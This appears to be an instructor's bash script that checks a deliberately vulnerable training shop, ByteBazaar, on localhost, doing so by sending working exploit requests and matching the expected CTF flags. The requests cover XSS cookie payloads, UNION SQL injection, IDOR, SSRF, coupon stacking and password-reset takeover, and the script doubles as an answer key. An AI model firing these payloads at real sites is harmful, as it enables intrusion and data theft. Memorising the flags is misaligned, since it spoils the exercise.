#!/usr/bin/env bash
# ByteBazaar end-to-end flag verifier (instructor tool).
# Exercises every planted bug against a running stack and prints PASS/FAIL.
#
#   BASE=http://localhost:8080 STAGING=http://localhost:8081 ./scripts/verify.sh
#
# Defaults match the README. No jq required.
set -u

BASE="${BASE:-http://localhost:8080}"
STAGING="${STAGING:-http://localhost:8081}"
HERE="$(cd "$(dirname "$0")" && pwd)"
JAR="$(mktemp)"
pass=0; fail=0

ck() { # label  expected-substring  haystack
  if printf '%s' "$3" | grep -qF "$2"; then
    printf '  \033[32mPASS\033[0m  %s\n' "$1"; pass=$((pass+1))
  else
    printf '  \033[31mFAIL\033[0m  %s  (missing: %s)\n' "$1" "$2"; fail=$((fail+1))
  fi
}

echo "== ByteBazaar verification =="
echo "   app:     $BASE"
echo "   staging: $STAGING"
echo

# Register a throwaway student and keep its session in $JAR.
U="verify_$RANDOM$RANDOM"
curl -s -c "$JAR" -b "$JAR" -X POST "$BASE/register" \
  --data-urlencode "username=$U" \
  --data-urlencode "email=$U@test.local" \
  --data-urlencode "password=pass1234" -o /dev/null

echo "-- Session 1 (warm-up) --"
H=$(curl -si "$BASE/")
ck "#1  intercept header"        "FLAG{bytebazaar_intercept_a1c0ffee42}" "$H"
ME=$(curl -s -b "$JAR" "$BASE/api/me")
ck "#2  client-side hidden flag" "FLAG{bytebazaar_clientside_7b3d2f9a}"  "$ME"

echo "-- Session 2 --"
RX=$(curl -si "$BASE/search?q=<script>alert(document.cookie)</script>")
ck "#3  reflected XSS (unescaped reflection)" "<script>alert(document.cookie)</script>" "$RX"
ck "#3  reflected XSS (reward cookie)"        "FLAG{bytebazaar_reflected_xss_9e4a1177}" "$RX"

curl -s -b "$JAR" -X POST "$BASE/product/1/review" \
  --data-urlencode 'body=<script>alert(document.cookie)</script>' \
  --data 'rating=5' -o /dev/null
SX=$(curl -si -b "$JAR" "$BASE/product/1")
ck "#4  stored XSS (unescaped render)" "<script>alert(document.cookie)</script>" "$SX"
ck "#4  stored XSS (reward cookie)"    "FLAG{bytebazaar_stored_xss_2c8fd6b0}"    "$SX"

SQLI=$(curl -s -G "$BASE/search" --data-urlencode "q=zzz' UNION SELECT id, secret_value, 0, name, '', '' FROM secrets-- -")
ck "#5  SQL injection (UNION exfil)" "FLAG{bytebazaar_sqli_5f0b7e33}" "$SQLI"
SQLE=$(curl -s -G "$BASE/search" --data-urlencode "q='")
ck "#5  SQL injection (verbose error)" "Database error" "$SQLE"

IDOR=$(curl -s -b "$JAR" "$BASE/api/orders/1")
ck "#6  IDOR (victim order PII+flag)" "FLAG{bytebazaar_idor_d41d8ce7}" "$IDOR"

BAC=$(curl -s "$BASE/api/admin/stats")
ck "#7  broken access control (no auth)" "FLAG{bytebazaar_bac_6a9f2b41}" "$BAC"

SSRF=$(curl -s -b "$JAR" -X POST "$BASE/seller/import-image" \
  --data-urlencode 'url=http://internal.bytebazaar.local/secret')
ck "#8  SSRF (internal service reached)" "FLAG{bytebazaar_ssrf_e3b0c442}" "$SSRF"

# Business logic: cheap item + stack HALFOFF twice -> total $0 -> flag.
curl -s -b "$JAR" -X POST "$BASE/cart/add"    --data 'product_id=4&quantity=1' -o /dev/null
curl -s -b "$JAR" -X POST "$BASE/cart/coupon" --data 'code=HALFOFF' -o /dev/null
curl -s -b "$JAR" -X POST "$BASE/cart/coupon" --data 'code=HALFOFF' -o /dev/null
LOGIC=$(curl -s -b "$JAR" -X POST "$BASE/cart/checkout" --data 'ship_name=x&ship_address=y')
ck "#9  business logic (coupon stacking)" "FLAG{bytebazaar_logic_1337c0de}" "$LOGIC"

# Auth: predictable reset token 100001 (alice). Re-arm first (the token is
# single-use, and another student/run may have already consumed it) — this is
# itself the unauthenticated forgot-password path, no ownership check.
curl -s -X POST "$BASE/forgot-password" --data 'email=alice@bytebazaar.local' -o /dev/null
AUTH=$(curl -s -X POST "$BASE/reset-password" --data 'token=100001&password=pwned123')
ck "#10 auth (predictable reset token)" "FLAG{bytebazaar_auth_beef4200}" "$AUTH"

echo "-- Recon (#11) --"
GIT=$(python3 "$HERE/git_recon.py" "$BASE" 2>/dev/null)
ck "#11a exposed .git"          "FLAG{bytebazaar_recon_git_ba5eba11}"        "$GIT"
STK=$(curl -s "$BASE/api/products/abc")
ck "#11b verbose stack trace"   "FLAG{bytebazaar_recon_stacktrace_0badf00d}" "$STK"
JS=$(curl -s "$BASE/js/app.js")
ck "#11c hardcoded key in JS"    "FLAG{bytebazaar_recon_jskey_ca11ab1e}"      "$JS"
DBG=$(curl -s "$STAGING/debug")
ck "#11d staging debug endpoint" "FLAG{bytebazaar_recon_staging_5ta91n9}"     "$DBG"
PROD=$(curl -s -o /dev/null -w '%{http_code}' "$BASE/debug")
ck "#11d /debug is 404 on prod"  "404" "$PROD"

echo "-- Session 3 (bonus) --"
BONUS=$(curl -s -b "$JAR" -X POST "$BASE/api/orders/1/cancel")
ck "#12 BFLA (cancel any order)" "FLAG{bytebazaar_bonus_bola_deadc0de}" "$BONUS"

echo
echo "== $pass passed, $fail failed =="
rm -f "$JAR"
[ "$fail" -eq 0 ]
